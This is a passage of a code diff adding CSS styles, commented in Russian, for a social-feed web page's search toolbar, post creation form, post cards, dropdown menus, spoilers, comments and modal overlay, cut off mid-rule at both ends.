+  }
+
+  /* Поиск */
+  .toolbar {
+    display: flex;
+    gap: 10px;
+    margin-bottom: 16px;
+    flex-wrap: wrap;
+  }
+
+  .search-box {
+    flex: 1;
+    min-width: 220px;
+  }
+
+  .search-box input {
+    width: 100%;
+    padding: 11px 14px;
+    border-radius: 10px;
+    border: 1px solid var(--border);
+    background: var(--card);
+    color: var(--text);
+    font-size: 0.95rem;
+    outline: none;
+    transition: 0.2s;
+    font-family: inherit;
+  }
+
+  .search-box input:focus { border-color: var(--accent); }
+
+  .sort-select {
+    padding: 11px 14px;
+    border-radius: 10px;
+    border: 1px solid var(--border);
+    background: var(--card);
+    color: var(--text);
+    font-size: 0.9rem;
+    outline: none;
+    cursor: pointer;
+    font-family: inherit;
+  }
+
+  /* Создание поста */
+  .create-post {
+    background: var(--card);
+    border: 1px solid var(--border);
+    border-radius: var(--radius);
+    padding: 20px;
+    margin-bottom: 20px;
+    transition: 0.3s;
+  }
+
+  .create-post.collapsed .create-body { display: none; }
+
+  .create-header {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    cursor: pointer;
+  }
+
+  .create-header h3 { font-size: 1rem; }
+
+  .create-body { margin-top: 16px; }
+
+  .create-body input,
+  .create-body textarea,
+  .create-body select {
+    width: 100%;
+    padding: 11px 12px;
+    border-radius: 9px;
+    border: 1px solid var(--border);
+    background: var(--card2);
+    color: var(--text);
+    font-family: inherit;
+    font-size: 0.95rem;
+    outline: none;
+    transition: 0.2s;
+    margin-bottom: 10px;
+  }
+
+  .create-body input:focus,
+  .create-body textarea:focus { border-color: var(--accent); }
+
+  .create-body textarea {
+    min-height: 70px;
+    resize: vertical;
+  }
+
+  .create-row {
+    display: flex;
+    gap: 10px;
+    flex-wrap: wrap;
+  }
+
+  .create-row input,
+  .create-row select { flex: 1; min-width: 140px; }
+
+  .create-actions {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    gap: 10px;
+    margin-top: 8px;
+    flex-wrap: wrap;
+  }
+
+  .char-count {
+    font-size: 0.8rem;
+    color: var(--muted);
+  }
+
+  .char-count.warn { color: var(--warn); }
+  .char-count.danger { color: var(--danger); }
+
+  /* Пост */
+  .post {
+    background: var(--card);
+    border: 1px solid var(--border);
+    border-radius: var(--radius);
+    padding: 18px 20px;
+    margin-bottom: 14px;
+    transition: 0.2s;
+    animation: slideUp 0.3s ease;
+  }
+
+  .post:hover {
+    border-color: var(--accent);
+    box-shadow: var(--shadow);
+  }
+
+  .post.pinned { border-color: var(--warn); }
+
+  .pin-label {
+    font-size: 0.75rem;
+    color: var(--warn);
+    font-weight: 600;
+    margin-bottom: 6px;
+  }
+
+  .post-header {
+    display: flex;
+    align-items: center;
+    gap: 10px;
+    margin-bottom: 10px;
+  }
+
+  .post-header .avatar { width: 38px; height: 38px; font-size: 0.95rem; }
+
+  .post-meta { flex: 1; min-width: 0; }
+
+  .post-author {
+    font-weight: 600;
+    font-size: 0.95rem;
+    cursor: pointer;
+  }
+
+  .post-author:hover { color: var(--accent2); }
+
+  .post-time { font-size: 0.78rem; color: var(--muted); }
+
+  .post-menu { position: relative; }
+
+  .post-menu-btn {
+    background: none;
+    border: none;
+    color: var(--muted);
+    cursor: pointer;
+    padding: 4px 8px;
+    border-radius: 6px;
+    font-size: 1.1rem;
+  }
+
+  .post-menu-btn:hover { background: var(--border); color: var(--text); }
+
+  .post-dropdown {
+    position: absolute;
+    top: 28px;
+    right: 0;
+    background: var(--card);
+    border: 1px solid var(--border);
+    border-radius: 8px;
+    min-width: 170px;
+    padding: 6px 0;
+    display: none;
+    z-index: 50;
+    box-shadow: var(--shadow);
+  }
+
+  .post-dropdown.show { display: block; }
+
+  .post-dropdown-item {
+    padding: 8px 14px;
+    cursor: pointer;
+    font-size: 0.9rem;
+    transition: 0.15s;
+  }
+
+  .post-dropdown-item:hover { background: var(--card2); }
+  .post-dropdown-item.danger { color: var(--danger); }
+
+  .post-action-text {
+    color: var(--muted);
+    font-size: 0.92rem;
+    margin-bottom: 6px;
+  }
+
+  .post-summary {
+    display: flex;
+    align-items: center;
+    gap: 8px;
+    flex-wrap: wrap;
+    background: var(--card2);
+    border-radius: 9px;
+    padding: 10px 12px;
+    margin-top: 8px;
+    border: 1px solid var(--border);
+  }
+
+  .post-tags {
+    flex: 1;
+    display: flex;
+    align-items: center;
+    gap: 6px;
+    flex-wrap: wrap;
+    font-size: 0.9rem;
+    min-width: 0;
+  }
+
+  .tag-hash { color: #74b9ff; font-weight: 600; }
+  .tag-user { color: var(--accent2); font-weight: 600; cursor: pointer; }
+  .tag-user:hover { text-decoration: underline; }
+  .tag-id {
+    background: var(--border);
+    color: var(--muted);
+    padding: 2px 8px;
+    border-radius: 6px;
+    font-size: 0.76rem;
+    font-family: 'Consolas', monospace;
+  }
+  .tag-reason { color: var(--warn); font-weight: 500; }
+  .tag-category {
+    background: var(--accent);
+    color: white;
+    padding: 2px 8px;
+    border-radius: 6px;
+    font-size: 0.75rem;
+    font-weight: 600;
+  }
+
+  .btn-plus {
+    width: 32px;
+    height: 32px;
+    border-radius: 8px;
+    border: 1px solid var(--border);
+    background: var(--card);
+    color: var(--accent2);
+    font-size: 1.1rem;
+    font-weight: 700;
+    cursor: pointer;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    transition: 0.2s;
+    flex-shrink: 0;
+  }
+
+  .btn-plus:hover {
+    background: var(--accent);
+    border-color: var(--accent);
+    color: white;
+  }
+
+  .btn-plus.open {
+    background: var(--accent);
+    border-color: var(--accent);
+    color: white;
+    transform: rotate(45deg);
+  }
+
+  .full-info {
+    display: none;
+    margin-top: 12px;
+    padding: 14px 16px;
+    background: var(--card2);
+    border-radius: 10px;
+    border-left: 3px solid var(--accent);
+  }
+
+  .full-info.open { display: block; animation: slideDown 0.25s ease; }
+
+  .full-info-title {
+    font-size: 0.75rem;
+    color: var(--accent2);
+    text-transform: uppercase;
+    letter-spacing: 0.6px;
+    margin-bottom: 10px;
+    font-weight: 700;
+  }
+
+  .full-info-block { margin-bottom: 10px; font-size: 0.92rem; }
+  .full-info-block:last-child { margin-bottom: 0; }
+
+  .full-info-label {
+    color: var(--muted);
+    font-size: 0.78rem;
+    text-transform: uppercase;
+    letter-spacing: 0.4px;
+    margin-bottom: 3px;
+    font-weight: 600;
+  }
+
+  .full-info-value {
+    color: var(--text);
+    white-space: pre-wrap;
+    word-break: break-word;
+  }
+
+  .full-info-value a { color: var(--accent2); }
+  .full-info-value strong { font-weight: 700; }
+  .full-info-value em { font-style: italic; }
+  .full-info-value code {
+    background: var(--card);
+    padding: 2px 6px;
+    border-radius: 4px;
+    font-family: 'Consolas', monospace;
+    font-size: 0.85em;
+  }
+
+  .spoiler {
+    background: var(--card);
+    color: var(--card);
+    padding: 2px 6px;
+    border-radius: 4px;
+    cursor: pointer;
+    user-select: none;
+  }
+
+  .spoiler.revealed { color: var(--text); background: transparent; }
+
+  .post-actions {
+    display: flex;
+    gap: 8px;
+    flex-wrap: wrap;
+    align-items: center;
+    margin-top: 12px;
+    padding-top: 12px;
+    border-top: 1px solid var(--border);
+  }
+
+  .action-btn {
+    background: none;
+    border: 1px solid var(--border);
+    color: var(--muted);
+    padding: 6px 12px;
+    border-radius: 8px;
+    cursor: pointer;
+    font-size: 0.82rem;
+    transition: 0.2s;
+    font-family: inherit;
+  }
+
+  .action-btn:hover { border-color: var(--accent); color: var(--accent2); }
+
+  .action-btn.liked {
+    background: rgba(255, 107, 107, 0.15);
+    border-color: #ff6b6b;
+    color: #ff6b6b;
+  }
+
+  .action-btn.saved {
+    background: rgba(253, 203, 110, 0.15);
+    border-color: var(--warn);
+    color: var(--warn);
+  }
+
+  .comments {
+    margin-top: 12px;
+    padding-top: 12px;
+    border-top: 1px solid var(--border);
+    display: none;
+  }
+
+  .comments.open { display: block; }
+
+  .comment {
+    padding: 10px 0;
+    display: flex;
+    gap: 10px;
+    animation: fadeIn 0.2s;
+    border-bottom: 1px solid var(--border);
+  }
+
+  .comment:last-of-type { border-bottom: none; }
+
+  .comment .avatar { width: 30px; height: 30px; font-size: 0.8rem; }
+
+  .comment-body { flex: 1; min-width: 0; }
+
+  .comment-head {
+    display: flex;
+    align-items: center;
+    gap: 8px;
+    margin-bottom: 4px;
+  }
+
+  .comment-author { font-weight: 600; font-size: 0.88rem; }
+  .comment-time { font-size: 0.75rem; color: var(--muted); }
+  .comment-text { font-size: 0.9rem; color: var(--text); word-break: break-word; }
+
+  .comment-actions {
+    display: flex;
+    gap: 10px;
+    margin-top: 4px;
+    font-size: 0.78rem;
+    color: var(--muted);
+  }
+
+  .comment-actions span { cursor: pointer; }
+  .comment-actions span:hover { color: var(--accent2); }
+
+  .comment-input {
+    display: flex;
+    gap: 8px;
+    margin-top: 10px;
+  }
+
+  .comment-input input {
+    flex: 1;
+    padding: 9px 12px;
+    border-radius: 8px;
+    border: 1px solid var(--border);
+    background: var(--card2);
+    color: var(--text);
+    font-size: 0.9rem;
+    outline: none;
+    font-family: inherit;
+  }
+
+  .comment-input input:focus { border-color: var(--accent); }
+
+  .empty {
+    text-align: center;
+    padding: 60px 20px;
+    color: var(--muted);
+    background: var(--card);
+    border: 1px dashed var(--border);
+    border-radius: var(--radius);
+  }
+
+  .empty-title {
+    font-size: 1.1rem;
+    margin-bottom: 6px;
+    color: var(--text);
+  }
+
+  /* Модалка */
+  .modal-overlay {
+    position: fixed;
+    inset: 0;
+    background: rgba(0,0,0,0.7);
+    display: none;
+    align-items: center;
+    justify-content: center;
+    z-in
